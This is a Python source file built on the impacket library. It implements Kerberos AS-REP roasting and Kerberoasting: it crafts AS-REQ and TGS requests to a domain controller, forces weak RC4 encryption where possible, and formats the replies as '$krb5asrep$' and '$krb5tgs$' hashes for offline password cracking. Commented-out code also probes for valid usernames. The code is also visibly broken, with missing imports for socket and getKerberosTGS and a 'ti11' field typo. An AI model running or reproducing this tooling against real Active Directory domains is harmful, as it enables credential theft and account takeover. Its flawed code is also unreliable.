import random
import sys
from binascii import hexlify
import datetime
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from impacket.examples import logger
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection
class TGT:
    def __init__(self, domain, username, dc, password='', preauth=False, nthash='', lmhash='', aeskey=''):
        self.username = username
        self.domain = domain
        self.password = password
        self.dc = dc
        self.preauth = preauth
        self.nthash = nthash
        self.lmhash = lmhash
        self.aeskey = aeskey
        self.dc_ip = socket.gethostbyname(self.dc)




    def run(self, save=False) -> {'tgt':any, 'cipher':any, 'oldSessionKey':any, 'newSessonKey':any}:
        """setting save to True will save the tgt to the {username}.ccache"""


        clientName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        asReq = AS_REQ()
        domain = self.domain.upper()
        serverName = Principal(f'krbtgt/{domain}', type=constants.PrincipalNameType.NT_MS_PRINCIPAL.value)
        pacR = KERB_PA_PAC_REQUEST()
        pacR['include-pac'] = True
        encodePac = encoder.encode(pacR)
        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodePac
        body = seq_set(asReq, 'req-body')
        opt = []
        opt.append(constants.KDCOptions.forwardable.value)
        opt.append(constants.KDCOptions.renewable.value)
        opt.append(constants.KDCOptions.proxiable.value)
        body['kdc-options'] = constants.encodeFlags(opt)
        seq_set(body, 'sname', serverName.components_to_asn1)
        seq_set(body, 'cname', clientName.components_to_asn1)
        body['realm'] = domain
        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        body['ti11'] = KerberosTime.to_asn1(now)
        body['rtime'] = KerberosTime.to_asn1(now)
        body['nonce'] = random.getrandbits(31)
        ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
        seq_set_iter(body, 'etype', ciphers)
        m = encoder.encode(asReq)
        try:
            r = sendReceive(m, domain, self.dc_ip)
        except KerberosError as e:
            ciphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
            seq_set_iter(body, 'etype', ciphers)
            m = encoder.encode(asReq)
            r = sendReceive(m, domain, self.dc_ip)
            print(e)
        try:
            asrep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            asrep = decoder.decode(r, asn1Spec=AS_REP())[0]
        first = asrep['enc-part']['etype']
        second = clientName
        third = domain
        fourth = hexlify(asrep['enc-part']['cipher'].asOctets()[:16])
        fifth = hexlify(asrep['enc-part']['cipher'].asOctets()[16:])
        return f'$krb5asrep${first}${second}@{third}:{fourth}${fifth}'

        # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        # try:
        #     tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
        #                                        kdcHost=self.dc_ip)
        
        #     return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':oldSessionKey, 'newSessionKey':newSessionKey}
        
        # except AttributeError:
        #     sys.stdout.flush()
        #     print("")
        #     print(f"\n3 found user: {self.username} \n")
        #     return None
        # except SessionError as e:
        #     try:
        #         code = e.getErrorCode()
        #         if code != 6:
        #             sys.stdout.flush()
        #             print(f"\n 1found user: {self.username} {e} on code: {code}")
        #     except:
        #         sys.stdout.flush()
        #         print(f"\n 2found user: {self.username}")
        # except Exception as e:
        #     print(f"1 {traceback.format_exc()}")
        #     print(f'trying with domain instead of user....')
        #     serverName = Principal('ldap/%s' % self.domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
        #     try:
        #         tgt, cipher, old, new = getKerberosTGT(serverName, password=self.password, 
        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
        #                                        kdcHost=self.dc_ip)
        #         return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
        #     except Exception as e:
        #         None

        #     return 1


def getName(machine):
    """ gets the machine name with the kdc host or domain """
    s = SMBConnection(machine, machine)
    return s.getServerName()


class TGS:
    def __init__(self, tgt, domain, cipher, oldSessionKey, newSessionKey, username, dc,password='', nthash=None, lmhash=None,preauth=False, aeskey=None):
        self.tgt = tgt
        self.cipher=cipher
        self.old = oldSessionKey
        self.new = newSessionKey
        self.username = username
        self.dc = dc
        self.password = password
        self.nthash = nthash
        self.lmhash = lmhash
        self.preauth = preauth
        self.aeskey = aeskey
        self.domain = domain
        self.dc_ip = socket.gethostbyname(self.dc)





    def run(self, fd=None):
        """change fd to save to file, will return entry if there is one"""
        spn = self.domain + '/' + self.username
        formatted_name = self.domain + "\\" + self.username
        userclient = Principal()
        userclient.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
        userclient.components = formatted_name
        entry = None
        tgs, cipher, old, key = getKerberosTGS(userclient, self.domain, self.dc_ip, self.tgt, self.cipher, self.new)
        if self.preauth == False:
            try:
                decodes = decoder.decode(tgs, asn1Spec=AS_REP())[0]
            except Exception as e:
                print(e)
                decodes = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        else:
            decodes = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        if decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodes['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, self.username, decodes['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodes['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodes['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        return entry

